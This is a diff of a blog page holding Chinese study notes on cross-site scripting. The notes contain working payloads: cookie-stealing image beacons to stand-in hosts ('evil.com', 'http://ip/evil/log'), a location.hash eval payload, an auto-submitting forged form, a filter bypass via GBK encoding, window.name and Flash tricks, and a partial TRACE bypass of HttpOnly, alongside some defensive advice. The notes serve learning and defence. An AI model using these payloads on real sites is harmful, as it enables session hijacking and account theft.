@@ -20,18 +20,26 @@
     var CONFIG = {"hostname":"vickytaiziyi.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="XSS">
+  <meta name="description" content="强大的XSS payload123var img &#x3D; document.createElement(&quot;img&quot;);img.src &#x3D; &quot;http:&#x2F;&#x2F;ip&#x2F;evil&#x2F;log?&quot; + escape(document.cookie);document.body.appendChild(img);   创建图片元素: var img &#x3D; document.crea">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS">
 <meta property="og:url" content="https://vickytaiziyi.github.io/2025/09/16/XSS/index.html">
 <meta property="og:site_name" content="VickyTaiziyi">
-<meta property="og:description" content="XSS">
+<meta property="og:description" content="强大的XSS payload123var img &#x3D; document.createElement(&quot;img&quot;);img.src &#x3D; &quot;http:&#x2F;&#x2F;ip&#x2F;evil&#x2F;log?&quot; + escape(document.cookie);document.body.appendChild(img);   创建图片元素: var img &#x3D; document.crea">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="e:/Typora/typora-user-images/img/image-20250916150556022-17580074303332.png">
+<meta property="og:image" content="e:/Typora/typora-user-images/img/image-20250916150723009-17580074303333.png">
+<meta property="og:image" content="e:/Typora/typora-user-images/img/image-20250916150650208-17580074303344.png">
+<meta property="og:image" content="e:/Typora/typora-user-images/img/image-20250916150821798-17580074303345.png">
+<meta property="og:image" content="e:/Typora/typora-user-images/img/image-20250831162028263-17580074303346.png">
+<meta property="og:image" content="e:/Typora/typora-user-images/img/image-20250916150918672-17580074303347.png">
+<meta property="og:image" content="e:/Typora/typora-user-images/img/image-20250916150943551-17580074303348.png">
 <meta property="article:published_time" content="2025-09-16T06:50:00.000Z">
-<meta property="article:modified_time" content="2025-09-16T06:57:48.846Z">
+<meta property="article:modified_time" content="2025-09-16T07:25:21.249Z">
 <meta property="article:author" content="VickyTaiziyi">
 <meta property="article:tag" content="XSS">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="e:/Typora/typora-user-images/img/image-20250916150556022-17580074303332.png">
 
 <link rel="canonical" href="https://vickytaiziyi.github.io/2025/09/16/XSS/">
 
@@ -185,7 +193,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2025-09-16 14:50:00 / 修改时间：14:57:48" itemprop="dateCreated datePublished" datetime="2025-09-16T14:50:00+08:00">2025-09-16</time>
+              <time title="创建时间：2025-09-16 14:50:00 / 修改时间：15:25:21" itemprop="dateCreated datePublished" datetime="2025-09-16T14:50:00+08:00">2025-09-16</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -206,13 +214,13 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>3</span>
+              <span>16k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>1 分钟</span>
+              <span>14 分钟</span>
             </span>
 
         </div>
@@ -224,7 +232,299 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>XSS</p>
+        <h2 id="强大的XSS-payload"><a href="#强大的XSS-payload" class="headerlink" title="强大的XSS payload"></a>强大的XSS payload</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://ip/evil/log?&quot;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>创建图片元素</strong>: <code>var img = document.createElement(&quot;img&quot;);</code> 这行代码在内存中创建了一个 <code>&lt;img&gt;</code> 标签，但它还没有被放到页面上。</p>
+</li>
+<li><p><strong>设置图片源</strong>: <code>img.src = &quot;http://www.evil.com/log? &quot;+escape(document.cookie);</code> 这是最关键的一步。它将图片的来源（<code>src</code>）设置成一个特殊的 URL。这个 URL 包含了两个部分：</p>
+<ul>
+<li><code>http://www.evil.com/log?</code>: 这是一个虚构的远程服务器地址，以及一个问号，表示后面跟着的是查询参数。</li>
+<li><code>escape(document.cookie)</code>: 这部分获取了当前网页的 <strong><code>document.cookie</code></strong> 对象，也就是浏览器存储的网站 <strong>Cookies</strong>。<code>escape()</code> 函数的作用是将这些 Cookie 值进行编码，以确保它们能安全地作为 URL 参数传输。</li>
+</ul>
+<p>当浏览器尝试加载这张图片时，它会向 <code>http://www.evil.com</code> 发送一个 <code>GET</code> 请求，而这个请求的 URL 中就包含了当前网站的 Cookies。</p>
+</li>
+<li><p><strong>插入页面</strong>: <code>document.body.appendChild(img);</code> 这行代码将创建的 <code>&lt;img&gt;</code> 标签插入到当前网页的 <code>&lt;body&gt;</code> 元素中。一旦这个标签被插入，浏览器就会立即开始尝试加载它的 <code>src</code> 指定的图片。</p>
+</li>
+</ul>
+<p><img src="E:/Typora/typora-user-images/img/image-20250916150556022-17580074303332.png" alt="image-20250916150556022"></p>
+<p><img src="E:/Typora/typora-user-images/img/image-20250916150723009-17580074303333.png" alt="image-20250916150723009"></p>
+<p><img src="E:/Typora/typora-user-images/img/image-20250916150650208-17580074303344.png" alt="image-20250916150650208"></p>
+<p>%3D是&#x3D;的编码</p>
+<p>状态码404表示&#x2F;evil&#x2F;log不存在，但请求仍记录在日志中<code> tail -f /var/log/httpd/access_log</code></p>
+<h4 id="构建表单"><a href="#构建表单" class="headerlink" title="构建表单"></a>构建表单</h4><p>主要内容:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> dd = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(dd); <span class="comment">//将这个 &lt;div&gt; 元素添加到页面的 &lt;body&gt; 中，成为 DOM（文档对象模型）的一部分。</span></span><br><span class="line">dd.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;form action=&quot;http://ip/vulnerable.php&quot; method=&quot;post&quot; id=&quot;xssform&quot; name=&quot;mbform&quot;&gt;&#x27;</span>+</span><br><span class="line"><span class="string">&#x27;&lt;input type=&quot;hidden&quot; value=&quot;JiUY&quot; name=&quot;ck&quot; /&gt;&#x27;</span>+</span><br><span class="line"><span class="string">&#x27;&lt;input type=&quot;text&quot; value=&quot;testtesttest&quot; name=&quot;mb_text&quot; /&gt;&#x27;</span>+</span><br><span class="line"><span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;xssform&quot;</span>).<span class="title function_">submit</span>(); <span class="comment">//自动提交</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">    <span class="keyword">if</span> (top.<span class="property">window</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;sid=&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">var</span> sid = top.<span class="property">window</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substr</span>(top.<span class="property">window</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;sid=&quot;</span>)+<span class="number">4</span>,<span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> folder_url = <span class="string">&quot;http://&quot;</span>+top.<span class="property">window</span>.<span class="property">location</span>.<span class="property">host</span>+<span class="string">&quot;/cgi-bin/mail_list? folderid=</span></span><br><span class="line"><span class="string">    1&amp;page=0&amp;s=inbox&amp;sid=&quot;</span>+sid;</span><br><span class="line">	<span class="comment">//创建</span></span><br><span class="line">    <span class="keyword">var</span> ajax = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)&#123;</span><br><span class="line">        ajax = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>)&#123;</span><br><span class="line">        ajax = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    ajax.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, folder_url, <span class="literal">true</span>);</span><br><span class="line">    ajax.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ajax.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; ajax.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">              <span class="title function_">alert</span>(ajax.<span class="property">responseText</span>);</span><br><span class="line">              <span class="comment">//document.write(ajax.responseText)</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(navigator.<span class="property">userAgent</span>);</span><br></pre></td></tr></table></figure>
+
+<p>用来识别用户的浏览器和设备，但是现在有很多插件可以屏蔽或自定义浏览器发送的UserAgent，所以并不一定准确。</p>
+<p><img src="E:/Typora/typora-user-images/img/image-20250916150821798-17580074303345.png" alt="image-20250916150821798"></p>
+<h2 id="XSS构造"><a href="#XSS构造" class="headerlink" title="XSS构造"></a>XSS构造</h2><h4 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redirectUrl=<span class="string">&quot;\&#x27;; alert(/XSS/); &#x27;&quot;</span>; <span class="title function_">alert</span>(<span class="regexp">/XSS/</span>); <span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>var redirectUrl=&quot;</code>：字符串开始。</li>
+<li><code>\&#39;</code>：这个<strong>单引号被转义了</strong>，所以它会被看作一个普通的单引号字符。到这里都没问题。</li>
+<li>;<code>：这里是关键。当浏览器解析到这个分号时，它会认为这是一条完整的 JavaScript 语句的结束。</code></li>
+<li>alert(&#x2F;XSS&#x2F;);<code>：这部分被浏览器当作一个独立的、可执行的 JavaScript 语句。</code></li>
+<li><code>&#39;</code>：这个单引号被浏览器当作了字符串的结束符。</li>
+<li><code>&quot;; alert(/XSS/); &quot;</code>：这部分代码就成了<strong>无效的语法</strong>，因为浏览器已经认为字符串结束了。</li>
+</ul>
+<h4 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h4><p>GBK&#x2F;GB2312编码的，“%c1\”这两个字符组合在一起后，会成为一个Unicode字符。在Firefox下会认为这是一个字符，所以构造：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c1<span class="string">&quot;; alert(/XSS/); //</span></span><br></pre></td></tr></table></figure>
+
+<p>这两个字节：“%c1\”组成了一个新的Unicode字符，“%c1”把转义符号“\”给“吃掉了”，从而绕过了系统的安全检查，成功实施了XSS攻击。</p>
+<h4 id="location-hash可以绕过长度限制"><a href="#location-hash可以绕过长度限制" class="headerlink" title="location.hash可以绕过长度限制"></a>location.hash<strong>可以绕过长度限制</strong></h4><p><code>location.hash</code> 指的是 URL 中 <code>#</code> 符号后面的那部分内容。比如在 <code>http://example.com/page.html#section2</code> 这个 URL 中，<code>location.hash</code> 的值就是 <code>#section2</code>。</p>
+<p>根据HTTP协议**，location.hash的内容不会在HTTP包中发送**，所以<strong>服务器端的Web日志中并不会记录下location.hash里的内容</strong>,可以利用它来<strong>绕过</strong>服务器端的安全检测（因为代码不在请求中），同时也能<strong>躲避</strong> Web 日志的追踪。当一个包含恶意 <code>location.hash</code> 的链接被点击时，攻击只会在用户的浏览器中发生，对服务器来说，一切都看起来是正常的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.html#var+img=new+Image();+img.src=&#x27;http://www.evil.com/log?cookie=&#x27;+escape(document.cookie);</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击流程：</strong></p>
+<ol>
+<li>用户点击这个恶意链接，并点击页面上的输入框。</li>
+<li><code>eval(location.hash.substr(1))</code> 被执行。</li>
+<li>它执行的代码是：<code>var img=new Image(); img.src=&#39;http://www.evil.com/log?cookie=&#39;+escape(document.cookie);</code></li>
+<li>这段代码在用户的浏览器中创建一个看不见的图片，并尝试加载它。</li>
+<li>图片的 URL 包含了 <code>document.cookie</code> 的值。</li>
+<li>这个请求会发送到攻击者的服务器 <code>www.evil.com</code>，并在服务器的日志中留下记录。</li>
+<li>攻击者检查日志，就能拿到用户的 Cookie，然后冒充用户登录。</li>
+</ol>
+<h4 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h4><p>还有一种方法可以绕过长度限制<strong>利用注释符绕过长度限制。</strong></p>
+<p>如果我们可以控制两个文本，第二个文本允许写入更多字节，此时可以利用”HTML”的注释符号，把两个文本之间的HTML代码全部注释掉，从而打通两个<code>&lt;input&gt;</code>标签</p>
+<p>1.在第一个<code>&lt;input&gt;</code>标签当中，输入<code>&quot;&gt;&lt;!--</code></p>
+<p>2.在第二个<code>&lt;input&gt;</code>标签当中，输入<code>--&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;</code></p>
+<p>3.最终的效果是： <code>&lt;input id=1 type=&quot;text&quot; value=&quot;&quot;&gt;&lt;! --&quot; /&gt;    xxxxxxxxxxxxxxxxx    &lt;input id=2 type=&quot;text&quot; value=&quot;--&gt;&lt;script&gt;alert(/xss/); &lt;/script&gt;&quot; /&gt;</code></p>
+<h4 id="标签"><a href="#标签" class="headerlink" title="&lt;base&gt;标签"></a><code>&lt;base&gt;</code>标签</h4><p><img src="E:/Typora/typora-user-images/img/image-20250831162028263-17580074303346.png" alt="image-20250831162028263"></p>
+<p><code>&lt;base&gt;</code> 标签是一个不常用但非常危险的 HTML 标签，它能让攻击者劫持整个页面的资源加载。</p>
+<p><code>&lt;base&gt;</code> 标签的作用是为页面上所有<strong>相对路径</strong>的 URL 设置一个基础 URL。</p>
+<ul>
+<li><strong>相对路径</strong>：指的是不包含域名或协议的路径，例如 <code>img.jpg</code> 或 <code>/images/logo.png</code>。</li>
+<li><strong>基础 URL</strong>：<code>&lt;base&gt;</code> 标签定义的 URL，它会作为所有相对路径的起点。</li>
+</ul>
+<p>当浏览器解析一个页面时，如果它遇到了一个相对路径的链接、图片或脚本，它会用 <code>&lt;base&gt;</code> 标签中定义的 URL 来补充这个路径，形成一个完整的绝对 URL。</p>
+<p>需要特别注意的是，在有的技术文档中，提到<code>&lt;base&gt;</code>标签只能用于<code>&lt;head&gt;</code>标签之内，其实这是不对的。<strong><code>&lt;base&gt;</code>标签可以出现在页面的任何地方，并作用于位于该标签之后的所有标签。</strong></p>
+<p><strong>攻击者如果在页面中插入了<code>&lt;base&gt;</code>标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签</strong></p>
+<h4 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h4><p><img src="E:/Typora/typora-user-images/img/image-20250916150918672-17580074303347.png" alt="image-20250916150918672"></p>
+<p>window.name对象是一个很神奇的东西。对当前窗口的window.name对象赋值，没有特殊字符的限制。因为<strong>window对象是浏览器的窗体，而并非document对象</strong>，因此很多时候window对象不受同源策略的限制。攻击er利用这个对象，可以实现跨域、跨页面传递数据。在某些环境下，这种特性将变得非常有用。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&quot;alert(document.cookie)&quot;</span>;</span><br><span class="line">    locaton.<span class="property">href</span> = <span class="string">&quot;http://www.xssedsite.com/xssed.php&quot;</span>;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">在同一窗口打开(受害者)<span class="variable constant_">XSS</span>的站点后，只需通过<span class="variable constant_">XSS</span>执行以下代码即可：</span><br><span class="line">	&lt;script&gt;<span class="built_in">eval</span>(name);&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">name</span>=<span class="string">&quot;alert(/XSS/)&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//页面刷新后，window.name 被设置为恶意代码，但不会执行。</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="variable language_">window</span>.<span class="property">name</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="E:/Typora/typora-user-images/img/image-20250916150943551-17580074303348.png" alt="image-20250916150943551"></p>
+<p><code>window.name</code> 的内容不会受到同源策略的限制。一个恶意的页面可以将攻击载荷写入 <code>window.name</code>，然后跳转到存在 XSS 漏洞的受害者网站</p>
+<h2 id="HTTP-Expect-Header-注入漏洞"><a href="#HTTP-Expect-Header-注入漏洞" class="headerlink" title="HTTP Expect Header 注入漏洞"></a><strong>HTTP Expect Header 注入漏洞</strong></h2><p>漏洞的原理：<strong>攻击者利用服务器对 Expect 头的处理不当，将恶意代码塞进了 HTTP 请求头的一个不寻常的地方，然后服务器错误地处理了这个请求头，最终导致了代码的执行。</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//Credits to Amit Klein as he wrote this, I just decompiled it</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前url</span></span><br><span class="line">    inURL = <span class="variable language_">this</span>.<span class="property">_url</span>;</span><br><span class="line"><span class="comment">// 提取&quot;?&quot;</span></span><br><span class="line">    inPOS = inURL.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;? &quot;</span>);</span><br><span class="line"><span class="comment">// 截取&quot;?&quot;所有字符，提取查询参数</span></span><br><span class="line">    inParam = inURL.<span class="title function_">substring</span>(inPOS + <span class="number">1</span>, inPOS.<span class="property">length</span>);</span><br><span class="line"><span class="comment">// 创建HTTP</span></span><br><span class="line">    req = <span class="keyword">new</span>自定义了一个 <span class="variable constant_">HTTP</span> 请求头 <span class="title class_">LoadVars</span>();</span><br><span class="line"><span class="comment">// 自定义了一个 HTTP 请求头</span></span><br><span class="line">    req.<span class="title function_">addRequestHeader</span>(<span class="string">&quot;Expect&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(\&#x27;&quot;</span> + inParam + <span class="string">&quot; is vulnerable to the</span></span><br><span class="line"><span class="string">    Expect Header vulnerability.\ &#x27;); &lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="comment">// 发送</span></span><br><span class="line">    req.<span class="title function_">send</span>(inParam, <span class="string">&quot;_blank&quot;</span>, <span class="string">&quot;POST&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS回旋镖"><a href="#XSS回旋镖" class="headerlink" title="XSS回旋镖"></a>XSS回旋镖</h2><p>因为浏览器同源策略的原因，XSS也受到同源策略的限制—发生在A域上的XSS很难影响到B域的用户。</p>
+<p>回旋镖的思路就是：如果在B域上存在一个反射型“XSS_B”，在A域上存在一个存储型“XSS_A”，当用户访问A域上的“XSS_A”时，同时嵌入B域上的“XSS_B”，则可以达到在A域的XSS攻击B域用户的目的。</p>
+<h2 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h2><p>代码 1：Flash 中的 ActionScript XSS</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getURL</span>(<span class="string">&quot;javascript:alert(document.cookie)&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>getURL是ActionScript 的方法，可以让Flash文件在浏览器打开一个URL或执行javaScript代码</p>
+<p>代码 2：将恶意 Flash 文件嵌入页面</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=<span class="string">&quot;http://yourhost/evil.swf&quot;</span></span><br><span class="line">       pluginspage=<span class="string">&quot;http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash&quot;</span><span class="comment">//pluginspage：如果用户没有安装 Flash Player，浏览器会提示从 Adobe 官网下载。</span></span><br><span class="line">       type=<span class="string">&quot;application/x-shockwave-flash&quot;</span> <span class="comment">//指定文件为flash，浏览器会调用flash player插件加载</span></span><br><span class="line">       width=<span class="string">&quot;0&quot;</span></span><br><span class="line">       height=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">&lt;/embed&gt;</span><br><span class="line">&lt;embed&gt;  标签将一个恶意的<span class="title class_">Flash</span>文件嵌入网页当中</span><br></pre></td></tr></table></figure>
+
+<p>当其他用户访问该页面时，浏览器加载 evil.swf，执行其中的 ActionScript 代码，触发 XSS（比如窃取 Cookie）。</p>
+<p> 尽可能让用户禁止上传或加载自定义的Flash文件，在实现XSS Fliter时，一般都会禁用<code>&lt;embed&gt;、&lt;object&gt;</code>等标签，后者甚至可以加载ActiveX控件，更加危险。若网站一定要使用Flash，如果仅仅只是视频文件，则要求转码为”flv”文件，flv文件是静态文件，不会产生安全隐患，如果是动态的，就要对Flash的配置参数进行限制。</p>
+<p>代码3:常见的嵌入Flash的代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;object classid=<span class="string">&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot;</span> <span class="comment">//用于IE加载Flash，这是唯一通用符</span></span><br><span class="line">        codebase=<span class="string">&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0&quot;</span><span class="comment">//若用户没有下载，则从此url下载</span></span><br><span class="line">        name=<span class="string">&quot;Main&quot;</span> width=<span class="string">&quot;1000&quot;</span> height=<span class="string">&quot;600&quot;</span> align=<span class="string">&quot;middle&quot;</span> id=<span class="string">&quot;Main&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">flashvars</span>=<span class="string">&quot;site=&amp;sitename=&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;Loading.swf?user=453156346&#x27;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">         <span class="attr">height</span>=<span class="string">&quot;600&quot;</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">quality</span>=<span class="string">&quot;high&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Main&quot;</span> <span class="attr">allowscriptaccess</span>=<span class="string">&quot;sameDomain&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">         <span class="attr">type</span>=<span class="string">&quot;application/x-shockwave-flash&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">         <span class="attr">pluginspage</span>=<span class="string">&quot;http://www.macromedia.com/go/getflashplayer&quot;</span> /&gt;</span></span></span><br><span class="line">&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御</strong>:限制Flash动态脚本的最重要的参数是“allowScriptAccess”，这个参数定义了Flash能否与HTML页面进行通信。</p>
+<p>它有三个可选值：</p>
+<p>❍ always，对与HTML的通信也就是执行JavaScript不做任何限制；</p>
+<p>❍ sameDomain，只允许来自于本域的Flash与Html通信，这是默认值；</p>
+<p>❍ never，绝对禁止Flash与页面通信。使用always是非常危险的，一般推荐使用never。如果值为sameDomain的话，请务必确保Flash文件不是用户传上来的。</p>
+<p>除了“allowScriptAccess”外，“allowNetworking”也非常关键，这个参数能控制Flash与外部网络进行通信。它有三个可选值：</p>
+<p>❍ <strong>all</strong>，允许使用所有的网络通信，也是默认值；</p>
+<p>❍ <strong>internal</strong>, Flash不能与浏览器通信如navigateToURL，但是可以调用其他的API；</p>
+<p>❍ <strong>none</strong>，禁止任何的网络通信。一般建议此值设置为none或者internal。设置为all可能带来安全问题。</p>
+<h2 id="JavaScript开发框架"><a href="#JavaScript开发框架" class="headerlink" title="JavaScript开发框架"></a>JavaScript开发框架</h2><p><strong>JavaScript框架只是对JavaScript语言的封装，不会解决代码逻辑上的问题。</strong></p>
+<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>严格地说，HttpOnly并非为了对抗XSS—HttpOnly解决的是<strong>XSS后的Cookie劫持攻击</strong>。</p>
+<p>**HttpOnly 的局限：**HttpOnly 防止 JavaScript 直接访问 document.cookie，但不阻止 Cookie 随 HTTP 请求发送到服务器。</p>
+<p>例如<strong>TRACE 的特性 绕过</strong>：Apache支持的一个Header是TRACE。TRACE一般用于调试，它会将请求头作为HTTP Response Body返回。TRACE 方法将请求头（包括 Cookie 头）回显在响应 body 中，而 JavaScript 可以读取响应 body（如 xmlHttp.responseText）。</p>
+<p>《Web前端黑客技术揭秘》:”<strong>TRACE方法被用于激发一个远程的应用层的请求消息回路，也就是说，回显服务器收到的请求。TRACE方法允许客户端去了解数据被请求链的另一端接收的情况，并且利用那些数据信息去测试或诊断。但此方法非常少见</strong>。”</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendTrace</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xmlHttp = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">    xmlHttp.<span class="title function_">open</span>(<span class="string">&quot;TRACE&quot;</span>, <span 